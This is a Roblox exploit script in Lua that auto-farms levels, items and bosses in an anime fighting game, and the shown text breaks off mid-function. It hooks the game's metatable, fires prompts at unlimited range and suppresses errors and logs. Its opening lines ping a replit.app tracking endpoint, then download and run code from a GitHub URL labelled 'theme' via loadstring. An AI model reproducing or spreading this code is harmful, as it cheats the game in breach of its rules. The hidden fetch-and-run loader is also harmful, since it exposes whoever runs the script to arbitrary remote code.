
repeat task.wait(2) until game:IsLoaded()
pcall(function() game:HttpGet("https://node-api--0890939481gg.replit.app/join") end)

-- theme
local _MDUCCDEV_THEME = "https://raw.githubusercontent.com/lnaa323sda/scki343/refs/heads/main/theme.lua"
pcall(function()
	loadstring(game:HttpGet(_MDUCCDEV_THEME))()
end)
task.wait(8)

-- [1] CONFIG
_G.Config = {
    AutoFarm        = true,     -- Auto Farm
    AutoHit         = true,     -- Auto Hit + Skill Z
    AutoStats       = true,     -- Auto Update Stats
    FpsBoost        = true,     -- BlackScreen for FPS; toggle only via true/false here (no button)
    HorstDisplay    = true,     -- Show stats via Horst

    -- Haki Quest
    HakiQuest       = true,     -- Auto Haki Quest
    HakiMinLevel    = 3000,     -- Min level to start Haki
    HakiTimeout     = 3600,     -- Timeout in seconds (= 60 minutes)

    -- Dark Blade
    BuyDarkBlade    = true,     -- Buy Dark Blade after getting Haki
    DarkBladeGems   = 150,      -- Gems required
    DarkBladeMoney  = 250000,   -- Money required

    -- Fruit Farm (ฟาร์มหาผลปีศาจ)
    FruitFarm       = false,     -- Enable/disable fruit farming
    FruitMinLevel   = 11500,    -- Min level to start fruit farm
    TargetFruit     = "Quake",  -- Target fruit
    FruitFarmIsland = "Shinjuku", -- Island to farm on
    FruitFarmPos    = CFrame.new(321.706757, -1.539090, -1756.500977) * CFrame.Angles(0, -0.113749, 0), -- ตำแหน่งฟาร์ม

    -- Boss Key Auto Buy (Auto Buy Boss Key)
    AutoBuyBossKey  = true,       -- Enable/disable auto buy Boss Key
    BossKeyBuyInterval = 1800,    -- Buy every 30 minutes (1800 seconds)
    
    -- Ichigo Exchange (Ichigo exchange (Boss Ticket for Ichigo Sword))
    ExchangeIchigo  = true,       -- Enable/disable Ichigo exchange
    IchigoMinLevel  = 11500,      -- Min level to start exchange
    IchigoRequirements = {        -- Required items
        BossTicket = 500,         -- 500 Boss Tickets
    },
    
    -- Saber Boss Farm (Farm Saber Boss for drops)
    FarmSaberBoss   = true,      -- Enable/disable Saber Boss farming
    SaberBossSummonItems = {     -- Items for summoning Saber Boss
        BossKey = 1,             -- Boss Key 1
        Money = 100000,          -- 100k Money
        Gems = 175,              -- 175 Gems
    },

    -- Stats Distribution (Total = 100%)
    StatSword       = 50,       -- Sword 50%
    StatDefense     = 30,       -- Defense 30%
    StatPower       = 20,       -- Power 20%

    -- Performance Settings
    GameSettings = {
        "DisablePvP", "DisableVFX", "DisableOtherVFX",
        "RemoveTexture", "AutoSkillC", "RemoveShadows",
    },

    -- Log Filter (Show only these tags)
    LogTags = {
        "[SYSTEM]", "[FARM]", "[HAKI", "[WEAPON",
        "[HORST]", "[STATS]", "[QUEST]", "[INVENTORY]",
        "[FRUIT]", "[DEBUG]",
    },
}

-- [2] SERVICES & VARIABLES
local Players       = game:GetService("Players")
local RS            = game:GetService("ReplicatedStorage")
local RunService    = game:GetService("RunService")
local VIM           = game:GetService("VirtualInputManager")
local HttpService   = game:GetService("HttpService")
local UIS           = game:GetService("UserInputService")
local Lighting      = game.Lighting
local BodyVelocity  = Instance.new("BodyVelocity")

local player        = Players.LocalPlayer
local Remotes       = RS:WaitForChild("Remotes")
local RemoteEvents  = RS:WaitForChild("RemoteEvents")
local CombatRemotes = RS:WaitForChild("CombatSystem"):WaitForChild("Remotes")

-- Remote References (Used in both files)
local hitRemote     = CombatRemotes:WaitForChild("RequestHit")
local questRemote   = RemoteEvents:WaitForChild("QuestAccept")
local abandonRemote = RemoteEvents:WaitForChild("QuestAbandon")
local statRemote    = RemoteEvents:WaitForChild("AllocateStat")
local tpRemote      = Remotes:WaitForChild("TeleportToPortal")
local settingsToggle = RemoteEvents:WaitForChild("SettingsToggle")

-- State (สถานะ runtime)
local inventoryByRarity = {
    Secret = {}, Mythical = {}, Legendary = {},
    Epic = {}, Rare = {}, Uncommon = {}, Common = {}
}
local cratesAndBoxes = {}
local isHakiQuestActive = false
local isBuyingDarkBlade = false
local isFruitFarming = false
local isFarmingIchigoBoss = false

-- [3] ERROR SUPPRESSION
local oldPrint = print
local oldWarn = warn

error = function() end
warn = function() end

pcall(function() game:GetService("ScriptContext").Error:Connect(function() end) end)
pcall(function() game:GetService("LogService").MessageOut:Connect(function() end) end)
pcall(function()
    game:GetService("TestService").Error:Connect(function() end)
    game:GetService("TestService").ServerOutput:Connect(function() end)
end)

print = function(...)
    local args = {...}
    if not args[1] then return end
    local text = tostring(args[1])

    -- Block error messages
    local blocked = {
        "Error","error","ERROR","Stack","stack","attempt to",
        "CrossExperience","CorePackages","nil value",
        "ServerScriptService",
    }
    for _, kw in ipairs(blocked) do
        if text:find(kw, 1, true) then return end
    end

    -- Show only logs in Config.LogTags
    for _, tag in ipairs(_G.Config.LogTags) do
        if text:find(tag, 1, true) then
            oldPrint(...)
            return
        end
    end
end

pcall(function()
    local mt = getrawmetatable(game)
    local oldNC = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = function(self, ...)
        local m = getnamecallmethod()
        if m == "print" or m == "warn" or m == "error" then return end
        return oldNC(self, ...)
    end
    setreadonly(mt, true)
end)

-- [4] UTILITY FUNCTIONS
local function getChar()
    local char = player.Character or player.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    local hum = char:WaitForChild("Humanoid")
    return char, hrp, hum
end

-- SmartTP: Use TeleportToPortal of the game (safe, not get kicked) v3
local function buildPortalMap()
    local map = {}
    for _, folder in ipairs(workspace:GetChildren()) do
        if folder:IsA("Folder") then
            for _, d in ipairs(folder:GetDescendants()) do
                if d:IsA("BasePart") then
                    local name = d.Name:match("Portal_(.+)") or d.Name:match("SpawnPointCrystal_(.+)")
                    if name then map[name] = d.Position end
                end
            end
        end
    end
    return map
end

local function getNearestIsland(targetPos)
    local nearest, nearestDist = nil, math.huge
    for name, pos in pairs(buildPortalMap()) do
        local dist = (pos - targetPos).Magnitude
        if dist < nearestDist then
            nearest, nearestDist = name, dist
        end
    end
    return nearest
end

_G.SmartTP = function(pos)
    local targetPos = CFrame.new(pos)
    local island = getNearestIsland(targetPos.Position)
    if not island then return print("[SmartTP] No portal found!") end
    tpRemote:FireServer(island)
    task.wait(0.5)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.CFrame = CFrame.new(targetPos.Position) end
end

local function tweenPos(targetCF, callback)
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end

    local distance = (targetCF.Position - root.CFrame.Position).Magnitude

    humanoid:ChangeState(Enum.HumanoidStateType.Physics)

    local function lockPhysics()
        for _, v in pairs(char:GetDescendants()) do
            if v:IsA("BasePart") then
                v.AssemblyLinearVelocity = Vector3.zero
                v.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    if distance <= 250 then
        lockPhysics()
        root.CFrame = targetCF
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        if callback then callback() end
        return
    else
        _G.SmartTP(targetCF.Position)
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        if callback then callback() end
    end
end

local function formatNumber(n)
    if n >= 1000000 then return string.format("%.1fM", n / 1000000) end
    if n >= 1000 then return string.format("%.0fK", n / 1000) end
    return tostring(n)
end

local function findDarkBladeInHand()
    for _, container in pairs({player.Character, player.Backpack}) do
        if container then
            for _, tool in pairs(container:GetChildren()) do
                -- Support both English and Thai
                local isDarkBlade = tool:IsA("Tool") and (
                    tool.Name:find("Dark Blade") or 
                    tool.Name:find("ดาบสีเข้ม") or 
                    tool.ToolTip == "Black Blade" or
                    tool.ToolTip:find("ดาบสีเข้ม")
                )
                if isDarkBlade then
                    return tool, container.Name
                end
            end
        end
    end
    return nil
end

local function checkOwnerDarkBlade()
    for _, container in pairs({player.Character, player.Backpack}) do
        if container then
            for _, tool in pairs(container:GetChildren()) do
                -- Support both English and Thai
                local isDarkBlade = tool:IsA("Tool") and (
                    tool.Name:find("Dark Blade") or 
                    tool.Name:find("ดาบสีเข้ม") or 
                    tool.ToolTip == "Black Blade" or
                    tool.ToolTip:find("ดาบสีเข้ม")
                )
                if isDarkBlade then
                    return true
                end
            end
        end
    end
    return false
end

local function checkDarkBlade(targetName)
    local result = false
    pcall(function()
        RS.Remotes.UpdateInventory.OnClientEvent:Connect(function(tab, data)
            for _, item in pairs(data) do
                -- Support both English and Thai
                if item.name == targetName or item.name == "ดาบสีเข้ม" or item.name:find("Dark Blade") then
                    result = true
                end
            end
        end)
        RS.Remotes.RequestInventory:FireServer()
    end)
    task.wait(0.5)
    return result
end

local function equipDarkBladeFromInventory()
    -- Try both English and Thai
    pcall(function()
        Remotes:WaitForChild("EquipWeapon"):FireServer(unpack({"Equip", "Dark Blade"}))
    end)
    task.wait(1)
    
    -- If still not equipped, try Thai
    if not findDarkBladeInHand() then
        pcall(function()
            Remotes:WaitForChild("EquipWeapon"):FireServer(unpack({"Equip", "ดาบสีเข้ม"}))
        end)
        task.wait(1)
    end
    
    return findDarkBladeInHand() ~= nil
end

local function getQuestInfo()
    local ok, result = pcall(function()
        return RemoteEvents.GetQuestArrowTarget:InvokeServer()
    end)
    return ok and result or nil
end

local function getNpcType(npcName)
    local ok, result = pcall(function()
        local module = require(RS.Modules.QuestConfig)
        for questNPC, questData in pairs(module.RepeatableQuests) do
            if questNPC == tostring(npcName) then
                for _, req in ipairs(questData.requirements) do
                    return req.npcType
                end
            end
        end
    end)
    return ok and result or nil
end

local function getBestWeapon()
    local weapons = {}
    for _, container in pairs({player.Backpack, player.Character}) do
        if container then
            for _, tool in pairs(container:GetChildren()) do
                if tool:IsA("Tool") and tool.Name ~= "Combat" then
                    local level = tonumber(tool.Name:match("Lv%.?%s*(%d+)")) or 0
                    table.insert(weapons, { name = tool.Name, level = level })
                end
            end
        end
    end
    table.sort(weapons, function(a, b) return a.level > b.level end)
    if #weapons > 0 then
        return weapons[1].name
    end
    return "Combat"
end

local function checkHakiStatus()
    local hasHaki = false
    local hakiInfo = ""
    pcall(function()
        local statsUI = player.PlayerGui:FindFirstChild("StatsPanelUI")
        if not statsUI then return end
        for _, desc in pairs(statsUI:GetDescendants()) do
            if desc.Name == "HakiProgressionFrame" and desc.Visible == true then
                hasHaki = true
                for _, child in pairs(desc:GetDescendants()) do
                    if child.Name == "HakiLevel" and child:IsA("TextLabel") then
                        hakiInfo = child.Text
                        break
                    end
                end
                break
            end
        end
    end)
    if hasHaki then
    end
    return hasHaki, hakiInfo
end

local function findNPC(npcType)
    local closest = nil
    for _, v in pairs(workspace.NPCs:GetChildren()) do
        if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart")
            and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
            local subName = v.Humanoid.DisplayName:gsub("%s+",""):gsub("%[Lv%.%s*%d+%]","")
            if npcType == tostring(subName) or v.Name == npcType then
                return v -- exact match
            end
            if subName:find(npcType, 1, true) or v.Name:find(npcType, 1, true) then
                closest = v -- fuzzy match
            end
        end
    end
    return closest
end

-- [5] PERFORMANCE - FPS Boost (Config) + Game Settings

-- Apply game settings
for _, setting in ipairs(_G.Config.GameSettings) do
    local current = player:FindFirstChild("Settings") and player.Settings:FindFirstChild(setting)
    if not current or current.Value ~= true then
        settingsToggle:FireServer(setting, true)
    end
end

-- Black Screen (FPS Boost) — controlled only by _G.Config.FpsBoost (true/false)
local function setBlack(state)
    if state then
        Lighting.Brightness = 0
        Lighting.GlobalShadows = false
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then v.LocalTransparencyModifier = 1 end
        end
    else
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then v.LocalTransparencyModifier = 0 end
        end
    end
end

setBlack(_G.Config.FpsBoost)

player.CharacterAdded:Connect(function()
    task.wait(1)
    setBlack(_G.Config.FpsBoost)
end)

-- [6] INVENTORY TRACKER
task.spawn(function()
    local updateInventory = Remotes:WaitForChild("UpdateInventory")
    local requestInventory = Remotes:WaitForChild("RequestInventory")
    local Modules = RS:WaitForChild("Modules")
    local ItemRarityConfig = require(Modules:WaitForChild("ItemRarityConfig"))

    updateInventory.OnClientEvent:Connect(function(category, items)
        if not items then return end
        local validCats = {Items=1, Accessories=1, Auras=1, Cosmetics=1, Melee=1, Sword=1, Power=1}
        if not validCats[category] then return end

        for _, item in pairs(items) do
            local name = item.name
            local qty = item.quantity or 1
            if not name then continue end

            -- Crates/Boxes
            if name:lower():find("crate") or name:lower():find("box") or name:lower():find("chest") then
                cratesAndBoxes[name] = qty
            end

            -- Rarity
            local ok, rarity = pcall(function() return ItemRarityConfig:GetRarity(name) end)
            if ok and rarity and inventoryByRarity[rarity] then
                inventoryByRarity[rarity][name] = qty
                if rarity == "Secret" or rarity == "Mythical" or rarity == "Legendary" then
                end
            end
        end
    end)

    task.wait(3)
    pcall(function() requestInventory:FireServer() end)
end)

-- F1 = Print Inventory
UIS.InputBegan:Connect(function(input, gp)
    if gp or input.KeyCode ~= Enum.KeyCode.F1 then return end
    local data = player:WaitForChild("Data", 2)
    if not data then return end

    local level = data:FindFirstChild("Level") and data.Level.Value or 0
    local money = data:FindFirstChild("Money") and data.Money.Value or 0
    local gems = data:FindFirstChild("Gems") and data.Gems.Value or 0


    -- Crates
    for name, qty in pairs(cratesAndBoxes) do
    end

    -- Items by rarity
    local order = {"Secret","Mythical","Legendary","Epic","Rare","Uncommon","Common"}
    local emojis = {Secret="🌟",Mythical="✨",Legendary="🔥",Epic="💜",Rare="💙",Uncommon="💚",Common="⚪"}
    for _, rarity in ipairs(order) do
        local items = inventoryByRarity[rarity]
        local count = 0
        for _ in pairs(items) do count = count + 1 end
        if count > 0 then
            for name, qty in pairs(items) do
            end
        end
    end
end)

-- [7] HORST DISPLAY
if _G.Config.HorstDisplay then
task.spawn(function()
    local data = player:WaitForChild("Data", 30)
    if not data then
        return
    end

    task.wait(5)

    while task.wait(1) do
        local level = (data:FindFirstChild("Level") and data.Level.Value) or 0
        local money = (data:FindFirstChild("Money") and data.Money.Value) or 0
        local gems  = (data:FindFirstChild("Gems") and data.Gems.Value) or 0

        -- Haki status (safe)
        local hakiStatus = "❌"
        pcall(function()
            local statsUI = player.PlayerGui:FindFirstChild("StatsPanelUI")
            if not statsUI then return end
            for _, desc in pairs(statsUI:GetDescendants()) do
                if desc.Name == "HakiProgressionFrame" and desc.Visible == true then
                    for _, child in pairs(desc:GetDescendants()) do
                        if child.Name == "HakiLevel" and child:IsA("TextLabel") then
                            hakiStatus = "✅ " .. child.Text
                            break
                        end
                    end
                    if hakiStatus == "❌" then hakiStatus = "✅ Haki" end
                    break
                end
            end
        end)

        -- Observation Haki status (safe)
        local obsHakiStatus = "❌"
        pcall(function()
            local statsUI = player.PlayerGui:FindFirstChild("StatsPanelUI")
            if not statsUI then return end
            for _, desc in pairs(statsUI:GetDescendants()) do
                if desc.Name:find("Observation") and desc:IsA("Frame") and desc.Visible == true then
                    -- Find level text
                    for _, child in pairs(desc:GetDescendants()) do
                        if child:IsA("TextLabel") and child.Text:find("Lv") then
                            obsHakiStatus = "✅ Obs " .. child.Text
                            break
                        end
                    end
                    if obsHakiStatus == "❌" then obsHakiStatus = "✅ Obs Haki" end
                    break
                end
            end
        end)

        -- Inventory summary
        local totalItems = 0
        local itemLists = {Secret={},Mythical={},Legendary={},Epic={},Rare={},Uncommon={},Common={}}
        for rarity, items in pairs(inventoryByRarity) do
            if itemLists[rarity] then
                for name, qty in pairs(items) do
                    table.insert(itemLists[rarity], name .. " x" .. qty)
                    totalItems = totalItems + 1
                end
            end
        end

        local cratesList = {}
        for name, qty in pairs(cratesAndBoxes) do
            table.insert(cratesList, name .. " x" .. qty)
        end

        -- Count Aura, Cosmetic Crate, Clan Reroll, Trait Reroll, Race Reroll
        local auraCount = 0
        local cosmeticCrateCount = 0
        local clanRerollCount = 0
        local traitRerollCount = 0
        local raceRerollCount = 0
        
        -- Check from inventory (all rarities)
        for _, items in pairs(inventoryByRarity) do
            for name, qty in pairs(items) do
                local lower = name:lower()
                if lower:find("aura") then
                    auraCount = auraCount + qty
                elseif lower:find("clan reroll") then
                    clanRerollCount = clanRerollCount + qty
                elseif lower:find("trait reroll") then
                    traitRerollCount = traitRerollCount + qty
                elseif lower:find("race reroll") then
                    raceRerollCount = raceRerollCount + qty
                end
            end
        end
        
        -- Check Cosmetic Crate from crates
        for name, qty in pairs(cratesAndBoxes) do
            if name:lower():find("cosmetic") then
                cosmeticCrateCount = cosmeticCrateCount + qty
            end
        end
        
        -- Build message
        local extraInfo = " 🌀Aura:" .. auraCount .. " 🎁Cosmetic:" .. cosmeticCrateCount .. " 🔄Clan:" .. clanRerollCount .. " 🎭Trait:" .. traitRerollCount .. " 🧬Race:" .. raceRerollCount
        local message = hakiStatus .. " " .. obsHakiStatus .. " ⭐LVL " .. level .. " 💰" .. formatNumber(money) .. " 💎" .. formatNumber(gems) .. extraInfo

        -- Important items
        local important = {}
        local importantNames = _G.Config.ImportantItems or {}

        for _, crateInfo in pairs(cratesList) do
            for _, keyword in pairs(importantNames) do
                if crateInfo:lower():find(keyword:lower()) then
                    table.insert(important, crateInfo)
                    break
                end
            end
        end

        for _, items in pairs(itemLists) do
            for _, itemInfo in pairs(items) do
                for _, keyword in pairs(importantNames) do
                    if itemInfo:lower():find(keyword:lower()) then
                        table.insert(important, itemInfo)
                        break
                    end
                end
            end
        end

        if #important > 0 then
            local display = {}
            for i = 1, math.min(4, #important) do
                table.insert(display, important[i])
            end
            message = message .. " " .. table.concat(display, " | ")
            if #important > 4 then message = message .. " +" .. (#important - 4) end
        elseif totalItems > 0 then
            message = message .. " Items: " .. totalItems
        else
            message = message .. " Loading..."
        end

        if #message > 180 then message = message:sub(1, 177) .. "..." end

        -- Send to Horst
        local json = {
            Level = level, Money = money, Gems = gems,
            Inventory = {
                Crates = #cratesList, TotalItems = totalItems,
                Secret = #itemLists.Secret, Mythical = #itemLists.Mythical,
                Legendary = #itemLists.Legendary, Epic = #itemLists.Epic,
                Rare = #itemLists.Rare, Uncommon = #itemLists.Uncommon,
                Common = #itemLists.Common,
            },
            CratesDetail = cratesAndBoxes,
            ItemsByRarity = inventoryByRarity,
        }
        pcall(function()
            _G.Horst_SetDescription(message, HttpService:JSONEncode(json))
        end)
    end
end)
end -- HorstDisplay

-- [8] AUTO HIT + AUTO STATS + AUTO OPEN BOXES
if _G.Config.AutoHit then
task.spawn(function()
    while task.wait(0.4) do
        pcall(function()
            local char = player.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            hitRemote:FireServer()

            -- สกิล Z ถ้ามอนใกล้
            local nearest, dist = nil, math.huge
            for _, npc in ipairs(workspace.NPCs:GetChildren()) do
                if npc:FindFirstChild("HumanoidRootPart") and npc:FindFirstChild("Humanoid") and npc.Humanoid.Health > 0 then
                    local d = (hrp.Position - npc.HumanoidRootPart.Position).Magnitude
                    if d < dist then dist = d; nearest = npc end
                end
            end
            if nearest and dist <= 12 then
                VIM:SendKeyEvent(true, "Z", false, game)
                task.wait(0.1)
                VIM:SendKeyEvent(false, "Z", false, game)
            end
        end)
    end
end)
end -- AutoHit

-- Auto Stats (Level 1-1000 = Melee only, Level 1000+ = Sword/Defense/Power)
if _G.Config.AutoStats then
task.spawn(function()
    while task.wait(5) do
        pcall(function()
            local points = player.Data.StatPoints.Value or 0
            if points <= 0 then return end

            local level = player.Data.Level.Value or 0

            if level < _G.Config.HakiMinLevel then
                -- Level 1-999: Melee 2 + Defense 1 ต่อรอบ (สัดส่วน 67%/33%)
                local melee, defense = 0, 0
                while points > 0 do
                    local m = math.min(2, points)
                    if m > 0 then statRemote:FireServer("Melee", m); points = points - m; melee = melee + m; task.wait(0.1) end
                    if points <= 0 then break end

                    local d = math.min(1, points)
                    if d > 0 then statRemote:FireServer("Defense", d); points = points - d; defense = defense + d; task.wait(0.1) end
                end
            else
                -- Level 1000+: อัพ Sword 50%, Defense 30%, Power 20%
                local sword, defense, power = 0, 0, 0
                while points > 0 do
                    local s = math.min(3, points)
                    if s > 0 then statRemote:FireServer("Sword", s); points = points - s; sword = sword + s; task.wait(0.1) end
                    if points <= 0 then break end

                    local d = math.min(2, points)
                    if d > 0 then statRemote:FireServer("Defense", d); points = points - d; defense = defense + d; task.wait(0.1) end
                    if points <= 0 then break end

                    local p = math.min(1, points)
                    if p > 0 then statRemote:FireServer("Power", p); points = points - p; power = power + p; task.wait(0.1) end
                end
            end
        end)
    end
end)
end -- AutoStats


-- [9] STATS & WEAPON SYSTEM
local function resetStats()
    pcall(function()
        local r = RemoteEvents:FindFirstChild("ResetStats")
        if r then r:FireServer() end
    end)
    task.wait(2)
end

local function upgradeStats()
    local points = 0
    pcall(function() points = player.Data.StatPoints.Value or 0 end)
    if points <= 0 then return end

    local swordPts   = math.floor(points * _G.Config.StatSword / 100)
    local defensePts = math.floor(points * _G.Config.StatDefense / 100)
    local powerPts   = math.floor(points * _G.Config.StatPower / 100)

    local stats = {
        { name = "Sword",   amount = swordPts },
        { name = "Defense", amount = defensePts },
        { name = "Power",   amount = powerPts },
    }

    pcall(function()
        local remote = RemoteEvents:FindFirstChild("UpdatePlayerStats")
            or RemoteEvents:FindFirstChild("AllocateStat")
        if not remote then return end

        for _, s in ipairs(stats) do
            for i = 1, s.amount do
                remote:FireServer(s.name, 1)
                task.wait(0.1)
            end
            task.wait(0.5)
        end
    end)

end

local function buyDarkBlade()
    isBuyingDarkBlade = true

    -- กรณีที่ 1: มีอยู่แล้ว (แบบ v3)
    if checkOwnerDarkBlade() then
        isBuyingDarkBlade = false
        return true
    end
    if checkDarkBlade("Dark Blade") or checkDarkBlade("ดาบสีเข้ม") then
        equipDarkBladeFromInventory()
        isBuyingDarkBlade = false
        return true
    end

    -- Case 2: Still don't have → Buy
    local gem = player.Data.Gems.Value
    local money = player.Data.Money.Value

    if gem < _G.Config.DarkBladeGems or money < _G.Config.DarkBladeMoney then
        isBuyingDarkBlade = false
        return false
    end

    -- Buy exactly v3: while loop + ResetStats + fireproximityprompt
    local npcCF = CFrame.new(-132.516449, 13.2661686, -1091.2699, 0.972926259, 0, 0.231115878, 0, 1, 0, -0.231115878, 0, 0.972926259)
    local maxAttempts = 20

    while not (checkDarkBlade("Dark Blade") or checkDarkBlade("ดาบสีเข้ม") or checkOwnerDarkBlade()) and maxAttempts > 0 do
        maxAttempts = maxAttempts - 1

        -- ResetStats before buy (v3)
        pcall(function()
            RemoteEvents:WaitForChild("ResetStats"):FireServer()
        end)

        local npcHRP = nil
        pcall(function()
            npcHRP = workspace.ServiceNPCs.DarkBladeNPC:FindFirstChild("HumanoidRootPart")
        end)

        if not npcHRP then
            tweenPos(npcCF)
            task.wait(1)
        else
            local prompt = npcHRP:FindFirstChild("DarkBladeShopPrompt")
            if prompt then
                prompt.MaxActivationDistance = math.huge
                fireproximityprompt(prompt)
                pcall(function()
                    RemoteEvents:WaitForChild("ResetStats"):FireServer()
                end)
                task.wait(5)
                equipDarkBladeFromInventory()
                task.wait(1)
            else
                tweenPos(npcCF)
                task.wait(1)
            end
        end
    end

    local purchased = checkDarkBlade("Dark Blade") or checkDarkBlade("ดาบสีเข้ม") or checkOwnerDarkBlade()
    if purchased then
        resetStats()
        upgradeStats()
        
        -- Equip Dark Blade after reset (support both English and Thai)
        task.wait(2)
        equipDarkBladeFromInventory()
        task.wait(1)
        
        if checkOwnerDarkBlade() then
        end
    end

    isBuyingDarkBlade = false
    return purchased
end

-- [10] FRUIT FARM SYSTEM
local function checkHasFruit(fruitName)
    
    -- Check if fruit is in hand or Backpack (use string.find because real name is "Quake Fruit")
    local char = player.Character
    local backpack = player:FindFirstChild("Backpack")
    
    -- Check in Character
    if char then
        for _, tool in pairs(char:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:find(fruitName) then
                return true  -- return immediately!
            end
        end
    end
    
    -- Check in Backpack
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:find(fruitName) then
                return true  -- return immediately!
            end
        end
    end
    
    -- If not found in Character/Backpack → Check via Inventory Remote
    local hasFruit = false
    local connection = nil
    
    connection = RS.Remotes.UpdateInventory.OnClientEvent:Connect(function(tab, data)
        for _, item in pairs(data) do
            if item.name and item.name:find(fruitName) then
                hasFruit = true
            end
        end
        if connection then
            connection:Disconnect()
        end
    end)
    
    pcall(function()
        RS.Remotes.RequestInventory:FireServer()
    end)
    
    task.wait(1)
    
    if connection then
        connection:Disconnect()
    end
    
    if hasFruit then
    end
    
    return hasFruit
end

local function equipFruit(fruitName)
    
    -- Try Equip from Backpack (use string.find)
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name:find(fruitName) then
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid:EquipTool(tool)
                    task.wait(1)
                    return true
                end
            end
        end
    end
    
    -- Try Equip via Remote (try both full name and short name)
    pcall(function()
        RS:WaitForChild("Remotes"):WaitForChild("EquipWeapon"):FireServer(unpack({"Equip", fruitName}))
    end)
    task.wait(0.5)
    pcall(function()
        RS:WaitForChild("Remotes"):WaitForChild("EquipWeapon"):FireServer(unpack({"Equip", fruitName .. " Fruit"}))
    end)
    task.wait(1)
    
    return checkHasFruit(fruitName)
end

local function buyRandomFruit()
    
    -- Position of GemFruitDealer NPC
    local npcCF = CFrame.new(400.641937, 2.79983521, 752.175842, 0.444819272, 0, 0.895620406, 0, 1, 0, -0.895620406, 0, 0.444819272)
    
    -- 1. tweenPos to find NPC
    tweenPos(npcCF)
    task.wait(3)
    
    -- 2. TP close to NPC
    local char = player.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = npcCF * CFrame.new(0, 0, -3)
    end
    task.wait(1)
    
    -- 3. Find Prompt in GemFruitDealer
    local prompt = nil
    pcall(function()
        local npc = workspace.ServiceNPCs.GemFruitDealer
        for _, desc in pairs(npc:GetDescendants()) do
            if desc:IsA("ProximityPrompt") then
                prompt = desc
                break
            end
        end
    end)
    
    if not prompt then
        return false
    end
    
    -- 4. Click to buy
    prompt.MaxActivationDistance = math.huge
    fireproximityprompt(prompt)
    task.wait(3)
    
    return true
end

-- Check what fruit is in Backpack/Character (only un-eaten fruits - has FruitData)
local function getAnyFruitFromBackpack()
    local backpack = player:FindFirstChild("Backpack")
    local char = player.Character
    
    -- Check in Backpack (only fruits)
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("FruitData") then
                return tool
            end
        end
    end
    
    -- Check in Character (only fruits that haven't been eaten)
    if char then
        for _, tool in pairs(char:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("FruitData") then
                return tool
            end
        end
    end
    
    return nil
end

-- Eat fruit (Equip → Activate → Click Yes in ConfirmUI)
local function eatFruit(fruitTool)
    if not fruitTool then return end
    
    local fruitName = fruitTool.Name
    
    local char = player.Character
    local humanoid = char and char:FindFirstChild("Humanoid")
    local backpack = player:FindFirstChild("Backpack")
    
    -- 1. Equip fruit
    if humanoid and fruitTool.Parent == backpack then
        humanoid:EquipTool(fruitTool)
        task.wait(0.5)
    end
    
    -- 2. Activate fruit → Open ConfirmUI
    pcall(function()
        fruitTool:Activate()
    end)
    task.wait(1)
    
    -- 3. Find ConfirmUI and click Yes
    local confirmUI = player.PlayerGui:FindFirstChild("ConfirmUI")
    if confirmUI and confirmUI.Enabled then
        local yesButton = confirmUI:FindFirstChild("MainFrame")
        if yesButton then
            yesButton = yesButton:FindFirstChild("ButtonsHolder")
        end
        if yesButton then
            yesButton = yesButton:FindFirstChild("Yes")
        end
        
        if yesButton then
            -- Method 1: Click Yes button
            pcall(function()
                for _, connection in pairs(getconnections(yesButton.MouseButton1Click)) do
                    connection:Fire()
                end
            end)
        end
    else
        -- If no UI → Fire remote directly
        pcall(function()
            RemoteEvents:WaitForChild("FruitAction"):FireServer("eat", fruitName)
        end)
    end
    
    task.wait(3)
    
    -- 4. Check if fruit has FruitData (Quake will be in Character but FruitData will be gone)
    local fruitTool = nil
    if backpack then
        fruitTool = backpack:FindFirstChild(fruitName)
    end
    if not fruitTool and char then
        fruitTool = char:FindFirstChild(fruitName)
    end
    
    if fruitTool and fruitTool:FindFirstChild("FruitData") then
        pcall(function()
            fruitTool:Destroy()
        end)
    end
end

local function allocateStatsPowerFirst()
    
    local points = 0
    pcall(function()
        points = player.Data.StatPoints.Value or 0
    end)
    
    if points <= 0 then
        return
    end
    
    -- Increase Power to 11500 first (send batch of 100)
    local powerStat = 0
    pcall(function()
        powerStat = player.Data.Power.Value or 0
    end)
    
    if powerStat < 11500 then
        local needed = 11500 - powerStat
        local toAllocate = math.min(needed, points)
        
        local remaining = toAllocate
        while remaining > 0 do
            local batch = math.min(100, remaining)
            pcall(function()
                statRemote:FireServer("Power", batch)
            end)
            remaining = remaining - batch
            task.wait(0.1)
        end
        
        points = points - toAllocate
    end
    
    -- Increase Sword remaining (send batch of 100)
    if points > 0 then
        local remaining = points
        while remaining > 0 do
            local batch = math.min(100, remaining)
            pcall(function()
                statRemote:FireServer("Sword", batch)
            end)
            remaining = remaining - batch
            task.wait(0.1)
        end
    end
    
end

local function fruitFarmLoop()
    
    local keyCodes = {Enum.KeyCode.Z, Enum.KeyCode.X, Enum.KeyCode.C, Enum.KeyCode.V}
    
    while _G.Config.FruitFarm and isFruitFarming do
        task.wait(0.5)
        
        local char = player.Character
        if not char or not char:FindFirstChild("HumanoidRootPart") then continue end
        if char.Humanoid.Health <= 0 then continue end
        
        local hrp = char.HumanoidRootPart
        local lockPos = _G.Config.FruitFarmPos
        
